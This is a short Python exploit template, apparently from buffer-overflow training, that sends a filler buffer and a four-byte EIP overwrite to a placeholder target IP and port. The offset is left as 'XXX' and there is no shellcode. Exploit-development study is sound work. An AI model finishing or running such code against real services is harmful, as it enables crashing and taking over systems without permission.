#!/usr/bin/python
#author: prorat
#twitter: @pr0rat

import socket
import sys

try:
  print("\n[+] Sending evil buffer...")

  #use the buffer length at which your target machine crashed
  offset = "A" * XXX
  eip = "C" * 4
  buffer=offset+eip

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("TARGETIP", PORT))
  s.send(buffer)
  
  s.close()
 
  print("\n[+] Sending buffer of " + str(len(buffer)) + " bytes...")
  print("\n[+] Sending buffer: " + buffer)
  print("\n[+] Done!")
  
except:
  print("\n[+] Could not connect!")
  sys.exit